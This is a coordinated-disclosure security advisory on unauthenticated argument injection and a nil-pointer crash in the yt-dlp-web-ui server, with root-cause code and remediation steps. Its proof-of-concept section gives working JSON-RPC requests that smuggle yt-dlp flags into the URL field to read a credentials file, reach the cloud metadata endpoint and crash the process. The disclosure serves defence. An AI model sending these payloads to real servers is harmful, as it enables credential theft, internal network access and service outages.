# Security Advisory: Unauthenticated CLI Argument Injection & Remote Denial of Service in marcopiovanello/yt-dlp-web-ui

- **Advisory ID**: SEC-ADV-2026-002
- **VulnCheck CVD Submission ID**: `5e19f1fb-77da-4263-bd28-ccbe975b72c7`
- **Published**: October 13, 2026
- **Researcher / Discoverer**: Miraziz Kuchkarov (VOID) (vazzzy.071@gmail.com / GitHub: [@vazzzy071-crypto](https://github.com/vazzzy071-crypto))
- **Status**: Public Reference for Dual CVE Publication (Repository Archived)

---

## 1. Executive Summary

Two distinct security primitives have been identified and confirmed in **yt-dlp-web-ui** (developed by **marcopiovanello**), a popular self-hosted web UI and RPC server for `yt-dlp` with over 2,590 GitHub stars. 

The application exposes JSON-RPC endpoints (`/rpc/http` and `/rpc/ws`) that accept user-supplied URLs without authentication in default configurations. These endpoints pass unvalidated strings into backend CLI executions without command option terminators (`--`) or `--no-exec` hardening flags.

The finding encompasses two eligible security primitives validated by VulnCheck:
1. **Primitive 1 (Argument Injection & SSRF / Arbitrary File Read)**: Unauthenticated CLI argument injection via the `url` parameter allows an attacker to inject CLI options such as `--load-info-json`, reflecting arbitrary local JSON files in the HTTP response, and coerce the server to fetch internal network resources (SSRF).
2. **Primitive 2 (Unhandled Nil Pointer Dereference / Remote DoS)**: Malformed or flag-based requests cause `formats.ParseURL()` to return `(nil, nil)`, which is subsequently dereferenced at `server/rpc/service.go:109`, triggering an uncaught Go runtime panic that terminates the entire server process.

---

## 2. Affected Software & Supplier Details

- **Impacted Supplier / Vendor**: `marcopiovanello` (Marco Piovanello)
- **Impacted Product**: `yt-dlp-web-ui` ("A web UI and RPC server for yt-dlp")
- **Repository**: [https://github.com/marcopiovanello/yt-dlp-web-ui](https://github.com/marcopiovanello/yt-dlp-web-ui) (Archived)
- **Affected Components**:
  - `server/formats/parser.go:13` (`formats.ParseURL`)
  - `server/internal/metadata/fetchers.go:18` (`DefaultFetcher`)
  - `server/playlist/playlist.go:26` (`PlaylistDetect`)
  - `server/internal/livestream/livestream.go:56`
  - `server/archive/utils.go:17`
  - `server/rpc/service.go:104-109` (`Service.Formats` panic crash site)
- **Affected Version(s)**: All versions up to **v4.0.0** (tested on release binary `yt-dlp-webui_linux-amd64` and repository commit `c7ad3bd7`).
- **Fixed Version**: None (Repository is archived).

---

## 3. Vulnerability Classification & Metrics

### Primitive 1: Command Argument Injection (SSRF & Arbitrary File Read)
- **Primary CWE**: [CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')](https://cwe.mitre.org/data/definitions/88.html)
- **Secondary CWE**: [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **CVSS v3.1 Base Score**: **7.5 (High)**

### Primitive 2: Unhandled Nil Pointer Dereference (Remote Denial of Service)
- **Primary CWE**: [CWE-476: NULL Pointer Dereference](https://cwe.mitre.org/data/definitions/476.html)
- **Secondary CWE**: [CWE-248: Uncaught Exception](https://cwe.mitre.org/data/definitions/248.html)
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **CVSS v3.1 Base Score**: **7.5 (High)**

---

## 4. Root Cause Analysis

### 4.1 Incomplete Hardening across Sibling Execution Paths
While historical maintainer commits hardened the primary download execution path by enforcing `--no-exec` (commit `14a03d6`), sibling metadata endpoints in `server/formats/parser.go` and `server/internal/metadata/fetchers.go` were left unprotected:
```go
// server/formats/parser.go:13
cmd := exec.Command(config.Instance().Paths.DownloaderPath, url, "-J")
```
No `--` option separator is placed prior to `url`, no prefix validation is enforced against leading hyphens (`-`), and authentication is disabled by default (`authentication.require_auth = false`).

### 4.2 Panic Site in RPC Service
In `server/rpc/service.go` (lines 104–109):
```go
metadata, err := formats.ParseURL(args.URL)
if err != nil && metadata == nil {
    return err
}
// When yt-dlp exits with code 0 on non-URL flags (such as --version or --help),
// metadata is returned as nil with err == nil.
if metadata.IsPlaylist() { // <-- Nil pointer dereference triggers fatal panic
    ...
}
```
This triggers an unhandled `panic: runtime error: invalid memory address or nil pointer dereference` that immediately terminates the Go process.

---

## 5. Proof of Concept (PoC)

### 5.1 Arbitrary Local JSON File Read
An attacker transmits a JSON-RPC request injecting `--load-info-json`:
```http
POST /rpc/http HTTP/1.1
Host: target-ytdlp:3033
Content-Type: application/json

{
  "method": "Service.Formats",
  "params": [{"url": "--load-info-json=/etc/app-credentials.json"}],
  "id": 1
}
```
**Response**: The target JSON file is parsed by `yt-dlp` and its fields are returned directly within the RPC result response.

### 5.2 Server-Side Request Forgery (SSRF)
```http
POST /rpc/http HTTP/1.1
Host: target-ytdlp:3033
Content-Type: application/json

{
  "method": "Service.Formats",
  "params": [{"url": "http://169.254.169.254/latest/meta-data/"}],
  "id": 2
}
```
**Response**: The server requests internal/cloud metadata and reflects extracted metadata attributes.

### 5.3 Remote Denial of Service (Crash)
```http
POST /rpc/http HTTP/1.1
Host: target-ytdlp:3033
Content-Type: application/json

{
  "method": "Service.Formats",
  "params": [{"url": "--version"}],
  "id": 3
}
```
**Result**: Connection closes immediately with an empty response. The server process terminates instantly with the following runtime log:
```text
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x...]
formats.(*Metadata).IsPlaylist(...)
    .../server/formats/types.go:15
rpc.(*Service).Formats(...)
    .../server/rpc/service.go:109
```

---

## 6. Remediation Guidance

For self-hosted instances running existing deployments:

1. **Option Separator**: Insert `--` before any user-provided URL in all `exec.Command(downloaderPath, "--", url, "-J")` calls.
2. **Reject Leading Dashes**: Validate user input and reject any URL string starting with `-`.
3. **Add `--no-exec`**: Append `--no-exec` to all metadata, format, and playlist parsing routines.
4. **Fix Nil Pointer Check**: Update `server/rpc/service.go` to explicitly verify `if metadata == nil`:
   ```go
   if err != nil || metadata == nil {
       if err != nil {
           return err
       }
       return errors.New("failed to parse metadata")
   }
   ```
5. **Enforce Authentication**: Set `authentication.require_auth: true` in server configuration.

---

## 7. Coordinated Disclosure Timeline & Attribution

- **Discoverer / Credit**: **Miraziz Kuchkarov (VOID)** (vazzzy.071@gmail.com / GitHub: [@vazzzy071-crypto](https://github.com/vazzzy071-crypto))
- **2026-09-23**: Full end-to-end local deployment reproduction and validation.
- **2026-09-27 04:45 UTC**: Coordinated Vulnerability Disclosure (CVD) report submitted to VulnCheck CNA (Submission ID: `5e19f1fb-77da-4263-bd28-ccbe975b72c7`).
- **2026-10-09 23:05 UTC**: VulnCheck confirmed validation of **2 valid security primitives eligible for CVE assignment** and requested public reference due to archived repository status.
- **2026-10-13**: Public security advisory published to provide the official reference required for CVE publication.

---

## 8. References

- Repository: `https://github.com/marcopiovanello/yt-dlp-web-ui`
- VulnCheck CVD Tracking: `5e19f1fb-77da-4263-bd28-ccbe975b72c7`
- CWE-88: [https://cwe.mitre.org/data/definitions/88.html](https://cwe.mitre.org/data/definitions/88.html)
- CWE-476: [https://cwe.mitre.org/data/definitions/476.html](https://cwe.mitre.org/data/definitions/476.html)
- CWE-918: [https://cwe.mitre.org/data/definitions/918.html](https://cwe.mitre.org/data/definitions/918.html)
